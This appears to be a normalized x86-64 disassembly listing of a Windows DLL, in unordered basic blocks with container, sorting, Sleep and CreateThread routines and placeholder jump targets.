mov rcx rbx
sar rax 0x3
lea rdi [ rax * 8 ]
mov r8 rdi
call sub_1800205e0
lea r11 [ rdi + rbx ]
mov [ rsi + 0x18 ] r11
mov rbx [ rsi + 0x48 ]
test rbx rbx
je r-xdata
test rax rax
je r-xdata
mov rax [ rax ]
mov rax r12
jmp r-xdata
mov rcx [ rsi + 0x40 ]
mov rbx [ rsp + 0x50 ]
test rcx rcx
je r-xdata
nop [ rax + rax ] ax
cmp [ rsi + 0x58 ] r12
jne r-xdata
dec rax
mov [ rsi + 0x58 ] rax
jne r-xdata
mov rax [ rax + 0x8 ]
mov rdx [ rsi + 0x58 ]
mov rcx [ rax + rcx * 8 ]
mov rbx [ rcx + rbx * 8 ]
test rdx rdx
je r-xdata
sub rcx rdx
mov rbx [ r11 + 0x10 ]
mov rdx [ rax + 0x10 ]
mov rcx rbx
and ebx 0x1
shr rcx 0x1
cmp rdx rcx
ja r-xdata
mov rcx [ rsi + 0x38 ]
mov [ rsi + 0x48 ] r12
mov [ rsi + 0x40 ] r12
call j_sub_18002094c#2
mov [ rsi + 0x38 ] r12
mov rcx [ rsi + 0x10 ]
test rcx rcx
je r-xdata
call j_sub_18002094c#2
test rbx rbx
jne r-xdata
mov rcx [ rcx + rbx * 8 ]
call j_sub_18002094c#2
mov [ rsi + 0x50 ] r12
test rbx rbx
je r-xdata
inc [ rsi + 0x50 ]
mov rcx [ rsi + 0x50 ]
mov rax [ rsi + 0x48 ]
add rax rax
cmp rax rcx
lea rax [ rdx - 0x1 ]
cmovbe rcx r12
mov [ rsi + 0x58 ] rax
mov [ rsi + 0x50 ] rcx
test rax rax
jne r-xdata
mov [ rsi + 0x10 ] r12
mov [ rsi + 0x18 ] r12
mov [ rsi + 0x20 ] r12
mov rsi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
call j_sub_18002094c#2
mov rcx [ rsi + 0x40 ]
dec rbx
cmp [ rcx + rbx * 8 ] r12
je r-xdata
inc rdi
cmp rdi [ rsi + 0x58 ]
jb r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
mov [ rsi + 0x50 ] r12
lea rdx [ rsp + 0x20 ]
lea rcx [ rsi + 0x38 ]
call sub_1800134c0
mov r11 rax
mov rax [ rax ]
test rax rax
jne r-xdata
mov rbp [ rsp + 0x58 ]
mov rcx rbx
call j_sub_18002094c#2
call sub_18002094c
sub_1800024e0
push rdi
sub rsp 0x40
xor edi edi
cmp [ rcx + 0x58 ] rdi
je r-xdata
mov rax rdi
add rsp 0x40
pop rdi
retn
mov [ rsp + 0x50 ] rbx
lea rbx [ rcx + 0x38 ]
lea rdx [ rsp + 0x20 ]
mov rcx rbx
call sub_1800134c0
mov r8 rax
mov rax [ rax ]
test rax rax
jne r-xdata
mov rax [ rax ]
mov eax edi
jmp r-xdata
mov rax [ rax + 0x8 ]
mov rcx [ rax + rcx * 8 ]
mov rdx [ rcx + r8 * 8 ]
mov r8 [ rbx + 0x20 ]
test r8 r8
je r-xdata
sub rcx rdx
mov r8 [ r8 + 0x10 ]
mov rdx [ rax + 0x10 ]
mov rcx r8
and r8d 0x1
shr rcx 0x1
cmp rdx rcx
ja r-xdata
mov rax rdx
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
inc [ rbx + 0x18 ]
mov rcx [ rbx + 0x18 ]
mov rax [ rbx + 0x10 ]
add rax rax
cmp rax rcx
lea rax [ r8 - 0x1 ]
cmovbe rcx rdi
mov [ rbx + 0x20 ] rax
test rax rax
mov rax rdx
mov [ rbx + 0x18 ] rcx
jne r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
mov [ rbx + 0x18 ] rdi
sub_1800025a0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rax rdx
mov rbp r9
mov rsi r8
sub rax rcx
mov rbx rdx
mov rdi rcx
sar rax 0x3
cmp rax 0x20
jle r-xdata
cmp rax 0x1
jle r-xdata
test rsi rsi
jle r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
xor r9d r9d
mov r8 rbp
mov rdx rbx
mov rcx rdi
call sub_1800015e0
cmp rax 0x20
jle r-xdata
lea rcx [ rsp + 0x30 ]
mov r9 rbp
mov r8 rbx
mov rdx rdi
call sub_180001dc0
mov r10 [ rsp + 0x38 ]
mov rax rsi
cqo
mov rcx rbx
mov r9 rbp
sub rax rdx
sub rcx r10
sar rax 0x1
and rcx 0xfffffffffffffff8
mov rsi rax
cqo
sub rax rdx
mov rdx [ rsp + 0x30 ]
sar rax 0x1
add rsi rax
mov rax rdx
sub rax rdi
mov r8 rsi
and rax 0xfffffffffffffff8
cmp rax rcx
jge r-xdata
mov rax rbx
sub rax rdi
and rax 0xfffffffffffffff8
cmp rax 0x8
jle r-xdata
mov rdx rbx
mov rcx r10
call sub_1800025a0
mov rbx [ rsp + 0x30 ]
mov rcx rdi
call sub_1800025a0
mov rdi [ rsp + 0x38 ]
jmp r-xdata
mov r8 rbp
mov rdx rbx
mov rcx rdi
call sub_180001fc0
jmp r-xdata
xor r9d r9d
mov r8 rbp
mov rdx rbx
mov rcx rdi
mov [ rsp + 0x20 ] 0x0
call sub_1800014c0
mov rax rbx
sub rax rdi
sar rax 0x3
cmp rax 0x20
jg r-xdata
sub_1800026e0
push rbx
sub rsp 0x20
cmp [ rdx + 0x18 ] 0x8
mov rbx rdx
jb r-xdata
xor eax eax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rax
mov [ rbx ] ax
add rsp 0x20
pop rbx
retn
mov rcx [ rdx ]
call j_sub_18002094c#2
sub_180002710
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x58 ] rsi
mov rbx rdx
mov rdi rcx
lea rax [ r--data ]
mov [ rcx ] rax
xor esi esi
mov [ rcx + 0x10 ] rsi
mov [ rcx + 0x18 ] rsi
mov [ rcx + 0x20 ] rsi
add rcx 0x38
lea rdx [ rsp + 0x48 ]
call sub_1800134e0
mov [ rdi + 0x30 ] rsi
mov [ rdi + 0x8 ] rbx
mov [ rdi + 0x70 ] rsi
mov [ rdi + 0x68 ] rsi
mov rax rdi
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
sub_180002780
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
push rbx
push rdi
sub rsp 0x48
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov rbx r8
mov [ rsp + 0x20 ] rbx
xor edi edi
nop [ rax ] eax
mov rax rbx
add rsp 0x48
pop rdi
pop rbx
retn
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rbx
test rbx rbx
je r-xdata
add rbx 0x28
mov [ rsp + 0x70 ] rbx
add rcx 0x28
mov [ rsp + 0x60 ] rcx
jmp r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov [ rbx ] di
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rcx
mov rcx rbx
call sub_180001ba0
mov rdx [ rsp + 0x68 ]
mov rcx [ rsp + 0x60 ]
cmp rcx rdx
je r-xdata
sub_180002810
cmp rdx r8
je r-xdata
retn
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov [ rsp + 0x30 ] rsi
mov rdi r8
mov rbx rdx
xor esi esi
nop [ rax ] eax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rsi [ rsp + 0x30 ]
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
sub_180002870
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rdi
sub rsp 0x20
mov rbx [ rcx ]
xor ebp ebp
mov rdi rcx
test rbx rbx
je r-xdata
mov rbx [ rsp + 0x38 ]
mov [ rdi ] rbp
mov [ rdi + 0x8 ] rbp
mov [ rdi + 0x10 ] rbp
mov rbp [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov [ rsp + 0x30 ] rsi
mov rsi [ rcx + 0x8 ]
cmp rbx rsi
je r-xdata
mov rcx [ rdi ]
call j_sub_18002094c#2
mov rsi [ rsp + 0x30 ]
nop [ rax + rax ] ax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rbp
mov [ rbx ] bp
add rbx 0x28
cmp rbx rsi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
sub_1800028f0
mov [ rsp + 0x8 ] rcx
push r12
sub rsp 0x40
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rsp + 0x58 ] rbx
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov r12 rdx
mov rbx rcx
xor ecx ecx
mov [ rbx ] rcx
mov [ rbx + 0x8 ] rcx
mov [ rbx + 0x10 ] rcx
mov r8 [ rdx + 0x8 ]
sub r8 [ rdx ]
mov rax 0x6666666666666667
imul r8
mov rdi rdx
sar rdi 0x4
mov rax rdi
shr rax 0x3f
add rdi rax
mov [ rbx ] rcx
mov [ rbx + 0x8 ] rcx
mov [ rbx + 0x10 ] rcx
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
mov rax 0x666666666666666
cmp rdi rax
jbe r-xdata
mov rdx rdi
lea rcx [ rbx + 0x18 ]
call sub_180003230
mov r8 rax
mov [ rbx ] rax
mov [ rbx + 0x8 ] rax
lea rax [ rdi + rdi * 4 ]
lea rcx [ r8 + rax * 8 ]
mov [ rbx + 0x10 ] rcx
movzx eax [ rsp + 0x50 ]
mov [ rsp + 0x20 ] al
lea r9 [ rbx + 0x18 ]
mov rdx [ r12 + 0x8 ]
mov rcx [ r12 ]
call sub_180002780
mov [ rbx + 0x8 ] rax
lea rcx [ r--data ]
call sub_18001f6b8
sub_1800029f0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x50
mov rax [ rdx ]
mov rdi rdx
mov rsi rcx
lea rdx [ rsp + 0x20 ]
mov rcx rdi
call [ rax + 0x28 ]
cmp [ rax ] 0x0
jne r-xdata
xor bl bl
mov r8 [ rax + 0x10 ]
cmp [ rax + 0x8 ] r8
jne r-xdata
mov rcx [ rsi + 0x30 ]
test rcx rcx
je r-xdata
xor al al
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x50
pop rdi
retn
mov bl 0x1
jmp r-xdata
mov rax [ rdi ]
mov rcx rdi
call [ rax + 0x10 ]
test al al
je r-xdata
mov rax [ rcx ]
call [ rax + 0x18 ]
lea rcx [ rsp + 0x28 ]
call sub_180002870
cmp bl 0x1
jne r-xdata
mov rbx [ rsp + 0x60 ]
mov [ rsi + 0x30 ] rdi
mov rsi [ rsp + 0x68 ]
mov al 0x1
add rsp 0x50
pop rdi
retn
sub_180002a80
mov rax rsp
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x80
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov rsi rcx
mov rcx [ rcx + 0x8 ]
mov rax [ rcx ]
call [ rax + 0x10 ]
mov r12d eax
mov rcx [ rsi + 0x8 ]
mov rdx [ rcx ]
call [ rdx + 0x10 ]
mov r13d eax
xor edi edi
mov rcx [ rsi + 0x30 ]
mov r8 [ rcx ]
lea rdx [ rsp + 0x50 ]
call [ r8 + 0x28 ]
mov r11 rax
lea rcx [ rax + 0x8 ]
mov rdx [ rcx + 0x8 ]
sub rdx [ rcx ]
mov r15 0x6666666666666667
mov rax r15
imul rdx
mov r14 rdx
sar r14 0x4
mov r8 r14
shr r8 0x3f
add r14 r8
movzx eax [ r11 + 0x3 ]
imul r14 rax
call sub_180002870
mov rcx [ rsi + 0x30 ]
mov rax [ rcx ]
call [ rax + 0x20 ]
test al al
jne r-xdata
mov rcx [ rsi + 0x8 ]
mov rax [ rcx ]
call [ rax + 0x10 ]
mov r13d eax
mov r12d eax
lea rcx [ rsi + 0x38 ]
lea rdx [ rsp + 0xb0 ]
call sub_180001cd0
jmp r-xdata
xor edi edi
mov rax rdi
inc rdi
cmp rax r14
jne r-xdata
mov rcx [ rsi + 0x8 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
mov rcx [ rsi + 0x8 ]
cmp r12d eax
mov rax [ rcx ]
jae r-xdata
call [ rax + 0x8 ]
mov r12d eax
jmp r-xdata
call [ rax + 0x10 ]
add r13d eax
mov r12d r13d
imul r12d r13d
jmp r-xdata
mov rax [ rsi + 0x18 ]
sub rax [ rsi + 0x10 ]
sar rax 0x3
cmp rax 0x1
jbe r-xdata
mov ecx r12d
call [ Sleep@IAT ]
mov r11 [ rsi + 0x30 ]
mov rbx [ r11 ]
mov rcx [ rsi + 0x8 ]
mov rax [ rcx ]
call [ rax ]
mov edx eax
mov rcx [ rsi + 0x30 ]
call [ rbx + 0x8 ]
mov [ rsp + 0xb0 ] rax
test rax rax
je r-xdata
xor bpl bpl
test rax rax
je r-xdata
xor ecx ecx
nop
mov rcx [ rsi + 0x18 ]
sub rcx [ rsi + 0x10 ]
sar rcx 0x3
movzx eax bpl
inc eax
cdqe
xor edx edx
div rcx
movzx eax dl
mov rdx [ rsi + 0x10 ]
mov rdx [ rdx + rax * 8 ]
mov rcx rsi
call sub_1800029f0
mov rcx [ rsi + 0x30 ]
mov rax [ rcx ]
lea rdx [ rsp + 0x50 ]
call [ rax + 0x28 ]
mov r11 rax
lea rcx [ rax + 0x8 ]
mov rdx [ rcx + 0x8 ]
sub rdx [ rcx ]
mov rax r15
imul rdx
mov r14 rdx
sar r14 0x4
mov rdx r14
shr rdx 0x3f
add r14 rdx
movzx eax [ r11 + 0x3 ]
imul r14 rax
call sub_180002870
inc bpl
movzx ecx bpl
mov rax [ rsi + 0x18 ]
sub rax [ rsi + 0x10 ]
sar rax 0x3
cmp rcx rax
jb r-xdata
mov rax [ rsi + 0x10 ]
mov rdi [ rax + rcx * 8 ]
mov rcx [ rsi + 0x30 ]
mov rax [ rcx ]
lea rdx [ rsp + 0x50 ]
call [ rax + 0x28 ]
mov rbx rax
mov r8 [ rdi ]
lea rdx [ rsp + 0x28 ]
mov rcx rdi
call [ r8 + 0x28 ]
movzx ecx [ rbx ]
cmp [ rax ] cx
sete bl
lea rcx [ rsp + 0x30 ]
call sub_180002870
nop
lea rcx [ rsp + 0x58 ]
call sub_180002870
test bl bl
jne r-xdata
jmp r-xdata
sub_180002cc0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x50
mov rax [ rcx + 0x18 ]
xor bpl bpl
movzx r13d dx
sub rax [ rcx + 0x10 ]
mov rsi rcx
sar rax 0x3
test rax rax
je r-xdata
xor al al
xor r14d r14d
mov edx r14d
nop [ rax + rax ] ax
test r12b r12b
jne r-xdata
mov rdi [ rsp + 0x30 ]
cmp rbx rdi
je r-xdata
mov rdx [ rsi + 0x10 ]
movzx eax bpl
mov rcx rsi
mov rdx [ rdx + rax * 8 ]
call sub_1800029f0
mov al 0x1
jmp r-xdata
mov rax [ rsi + 0x18 ]
inc bpl
sub rax [ rsi + 0x10 ]
movzx edx bpl
sar rax 0x3
cmp rdx rax
jb r-xdata
mov rcx rbx
call j_sub_18002094c#2
nop
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rdi [ r11 + 0x38 ]
mov rsp r11
pop r14
pop r13
pop r12
retn
mov rax [ rsi + 0x10 ]
mov rcx [ rax + rdx * 8 ]
lea rdx [ rsp + 0x20 ]
mov rax [ rcx ]
call [ rax + 0x28 ]
mov rbx [ rsp + 0x28 ]
cmp [ rax ] r13w
sete r12b
test rbx rbx
je r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r14
mov [ rbx ] r14w
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rbx [ rsp + 0x28 ]
sub_180002dd0
push rdi
sub rsp 0x80
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x90 ] rbx
mov rdi rdx
mov rax [ rcx ]
lea rdx [ rsp + 0x50 ]
call [ rax + 0x28 ]
mov rbx rax
mov r8 [ rdi ]
lea rdx [ rsp + 0x28 ]
mov rcx rdi
call [ r8 + 0x28 ]
movzx ecx [ rax + 0x2 ]
cmp [ rbx + 0x2 ] cl
setb bl
lea rcx [ rsp + 0x30 ]
call sub_180002870
nop
lea rcx [ rsp + 0x58 ]
call sub_180002870
movzx eax bl
mov rbx [ rsp + 0x90 ]
add rsp 0x80
pop rdi
retn
sub_180002e40
push rbx
sub rsp 0x30
mov rax [ rcx + 0x18 ]
mov rbx rcx
sub rax [ rcx + 0x10 ]
test rax 0xfffffffffffffff8
je r-xdata
add rsp 0x30
pop rbx
retn
mov rdx [ rcx + 0x10 ]
mov rdx [ rdx ]
call sub_1800029f0
test al al
je r-xdata
lea rax [ rsp + 0x40 ]
lea r8 [ sub_180001080 ]
mov r9 rbx
mov [ rsp + 0x28 ] rax
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
call [ CreateThread@IAT ]
mov [ rbx + 0x70 ] rax
test rax rax
je r-xdata
lea rax [ rsp + 0x48 ]
lea r8 [ sub_180001050 ]
mov r9 rbx
mov [ rsp + 0x28 ] rax
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
call [ CreateThread@IAT ]
mov [ rbx + 0x68 ] rax
sub_180002ed0
mov rax rsp
mov [ rax + 0x10 ] rdx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x50
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov rsi rdx
mov rbp rcx
xor r12b r12b
mov rax [ rcx + 0x18 ]
sub rax [ rcx + 0x10 ]
sar rax 0x3
xor r15d r15d
test rax rax
je r-xdata
mov rdx [ rbp + 0x18 ]
mov rcx [ rbp + 0x10 ]
mov r8 rdx
sub r8 rcx
sar r8 0x3
lea r9 [ sub_180002dd0 ]
call sub_1800025a0
nop
mov rbx [ rsi + 0x8 ]
test rbx rbx
je r-xdata
mov r13d r15d
nop [ rax ] eax
mov [ rsi + 0x8 ] r15
mov [ rsi + 0x10 ] r15
mov [ rsi + 0x18 ] r15
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rdi [ rsi + 0x10 ]
cmp rbx rdi
je r-xdata
test r14b r14b
je r-xdata
mov rdi [ rsp + 0x38 ]
cmp rbx rdi
je r-xdata
mov rcx [ rsi + 0x8 ]
call j_sub_18002094c#2
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
inc r12b
movzx r13d r12b
mov rax [ rbp + 0x18 ]
sub rax [ rbp + 0x10 ]
sar rax 0x3
cmp r13 rax
jb r-xdata
mov rax [ rbp + 0x10 ]
mov rbx [ rax + r13 * 8 ]
movzx eax [ rsi ]
mov [ rsp + 0x28 ] ax
movzx eax [ rsi + 0x2 ]
mov [ rsp + 0x2a ] al
movzx eax [ rsi + 0x3 ]
mov [ rsp + 0x2b ] al
lea rdx [ rsi + 0x8 ]
lea rcx [ rsp + 0x30 ]
call sub_1800028f0
mov r11 [ rbx ]
lea rdx [ rsp + 0x28 ]
mov rcx rbx
call [ r11 + 0x30 ]
mov rcx rbx
call j_sub_18002094c#2
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r15
mov [ rbx ] r15w
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
mov rax [ rbp + 0x10 ]
mov rcx [ rax + r13 * 8 ]
mov rax [ rcx ]
lea rdx [ rsp + 0x28 ]
call [ rax + 0x28 ]
movzx ecx [ rsi ]
cmp [ rax ] cx
sete r14b
mov rbx [ rsp + 0x30 ]
test rbx rbx
je r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r15
mov [ rbx ] r15w
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
mov rbx [ rsp + 0x30 ]
sub_180003160
push rbx
sub rsp 0x20
mov rbx [ rcx + 0x10 ]
test rbx rbx
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
mov rcx rbx
call j_sub_18002094c#2
call sub_18002094c
sub_180003190
movzx eax [ rcx + 0x80 ]
mov r8 [ rcx + 0x68 ]
xor edx edx
sub r8 [ rcx + 0x60 ]
inc eax
mov r9 rcx
cdqe
sar r8 0x2
div r8
mov rax [ r9 + 0x60 ]
mov [ rcx + 0x80 ] dl
movzx ecx dl
mov eax [ rax + rcx * 4 ]
retn
sub_1800031c0
sub rsp 0x48
xor eax eax
test rdx rdx
je r-xdata
add rsp 0x48
retn
mov rax 0x3fffffffffffffff
cmp rdx rax
ja r-xdata
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x58 ] 0x0
call sub_180020424
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_1800210a4
int3
lea rcx [ rdx * 4 ]
call sub_180021000
test rax rax
jne r-xdata
sub_180003230
sub rsp 0x48
xor eax eax
test rdx rdx
je r-xdata
add rsp 0x48
retn
mov rax 0x666666666666666
cmp rdx rax
ja r-xdata
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x58 ] 0x0
call sub_180020424
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_1800210a4
int3
lea rcx [ rdx + rdx * 4 ]
shl rcx 0x3
call sub_180021000
test rax rax
jne r-xdata
sub_1800032a0
sub rsp 0x48
xor eax eax
test rdx rdx
je r-xdata
add rsp 0x48
retn
mov rax 0xfffffffffffffff
cmp rdx rax
ja r-xdata
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x58 ] 0x0
call sub_180020424
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_1800210a4
int3
shl rdx 0x4
mov rcx rdx
call sub_180021000
test rax rax
jne r-xdata
sub_180003340
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x20
mov rbp [ rcx + 0x8 ]
mov rdi r8
mov rsi rdx
mov rbx rcx
test rbp rbp
je r-xdata
mov [ rcx + 0x8 ] r8
mov [ rcx ] rdx
jmp r-xdata
[ rbp + 0x8 ]
mov [ rsp + 0x30 ] r12
jne r-xdata
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov [ rcx + 0x8 ] r8
mov [ rcx ] rdx
jmp r-xdata
mov rax [ rbp ]
mov rcx rbp
call [ rax ]
[ rbp + 0xc ]
jne r-xdata
mov r12 [ rsp + 0x30 ]
mov [ rbx + 0x8 ] rdi
mov [ rbx ] rsi
mov rax [ rbp ]
mov rcx rbp
call [ rax + 0x8 ]
sub_1800033c0
mov [ rsp + 0x10 ] rdx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov rbx rdx
mov rdi rcx
mov ecx 0x18
call sub_180021000
test rax rax
je r-xdata
mov r8 rax
mov rdx rbx
mov rcx rdi
call sub_180003340
nop
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov [ rax + 0x8 ] 0x1
mov [ rax + 0xc ] 0x1
lea rcx [ r--data ]
mov [ rax ] rcx
mov [ rax + 0x10 ] rbx
sub_180003430
mov [ rsp + 0x10 ] rbx
push rsi
mov r9 rdx
mov r10 r8
mov rbx rcx
sub r9 rcx
sub r10 rcx
mov rsi r8
sar r9 0x2
sar r10 0x2
mov r11 r10
mov rcx r9
test r9 r9
je r-xdata
cmp r11 r10
jge r-xdata
nop [ rax + rax ] eax
mov rbx [ rsp + 0x18 ]
pop rsi
retn
test r11 r11
jle r-xdata
mov rax r11
mov r11 rcx
cqo
idiv rcx
mov rcx rdx
test rdx rdx
jne r-xdata
mov [ rsp + 0x10 ] rdi
lea r10 [ r9 * 4 ]
lea r8 [ rbx + r11 * 4 ]
nop
mov rax r9
sub rax rcx
lea rdx [ rbx + rax * 4 ]
add rdx r10
jmp r-xdata
mov ecx [ rdi ]
mov eax [ rdx ]
mov [ rdi ] eax
mov [ rdx ] ecx
mov rcx rsi
sub rcx rdx
mov rdi rdx
sar rcx 0x2
cmp r9 rcx
jge r-xdata
dec r11
sub r8 0x4
test r11 r11
jg r-xdata
cmp rdx r8
jne r-xdata
lea rdx [ r8 + r10 ]
mov rdi r8
cmp rdx rsi
cmove rdx rbx
nop
mov rdi [ rsp + 0x10 ]
sub_1800034f0
push rbx
sub rsp 0x20
cmp [ rcx + 0x18 ] 0x10
mov rbx rcx
jb r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov [ rbx ] 0x0
add rsp 0x20
pop rbx
retn
mov rcx [ rcx ]
call j_sub_18002094c#2
sub_180003530
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
test rcx rcx
je r-xdata
xor eax eax
mov [ rbx ] rax
mov [ rbx + 0x8 ] rax
mov [ rbx + 0x10 ] rax
add rsp 0x20
pop rbx
retn
call j_sub_18002094c#2
sub_180003560
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x58 ] rdi
mov rdi rdx
mov rbx rcx
mov rax 0x3fffffffffffffff
cmp rdx rax
jbe r-xdata
mov rax [ rcx + 0x10 ]
sub rax [ rcx ]
sar rax 0x2
cmp rax rdx
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x30
pop r12
retn
add rcx 0x18
call sub_1800031c0
mov rsi rax
mov [ rsp + 0x48 ] rax
mov r8 [ rbx + 0x8 ]
mov rdx [ rbx ]
sub r8 rdx
and r8 0xfffffffffffffffc
mov rcx rax
call sub_1800205e0
nop
mov rcx [ rbx ]
mov r12 [ rbx + 0x8 ]
sub r12 rcx
sar r12 0x2
test rcx rcx
je r-xdata
lea rax [ rsi + rdi * 4 ]
mov [ rbx + 0x10 ] rax
lea rax [ rsi + r12 * 4 ]
mov [ rbx + 0x8 ] rax
mov [ rbx ] rsi
call j_sub_18002094c#2
sub_180003620
mov [ rsp + 0x10 ] rdx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov rbx rdx
mov rdi rcx
mov ecx 0x18
call sub_180021000
test rax rax
je r-xdata
mov r8 rax
mov rdx rbx
mov rcx rdi
call sub_180003340
nop
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov [ rax + 0x8 ] 0x1
mov [ rax + 0xc ] 0x1
lea rcx [ r--data ]
mov [ rax ] rcx
mov [ rax + 0x10 ] rbx
sub_180003690
mov [ rsp + 0x10 ] rbx
push rsi
mov r9 rdx
mov r10 r8
mov rbx rcx
sub r9 rcx
sub r10 rcx
mov rsi r8
sar r9 0x3
sar r10 0x3
mov r11 r10
mov rcx r9
test r9 r9
je r-xdata
cmp r11 r10
jge r-xdata
nop [ rax + rax ] eax
mov rbx [ rsp + 0x18 ]
pop rsi
retn
test r11 r11
jle r-xdata
mov rax r11
mov r11 rcx
cqo
idiv rcx
mov rcx rdx
test rdx rdx
jne r-xdata
mov [ rsp + 0x10 ] rdi
lea r10 [ r9 * 8 ]
lea r8 [ rbx + r11 * 8 ]
nop
mov rax r9
sub rax rcx
lea rdx [ rbx + rax * 8 ]
add rdx r10
jmp r-xdata
mov rcx [ rdi ]
mov rax [ rdx ]
mov [ rdi ] rax
mov [ rdx ] rcx
mov rcx rsi
sub rcx rdx
mov rdi rdx
sar rcx 0x3
cmp r9 rcx
jge r-xdata
dec r11
sub r8 0x8
test r11 r11
jg r-xdata
cmp rdx r8
jne r-xdata
lea rdx [ r8 + r10 ]
mov rdi r8
cmp rdx rsi
cmove rdx rbx
nop
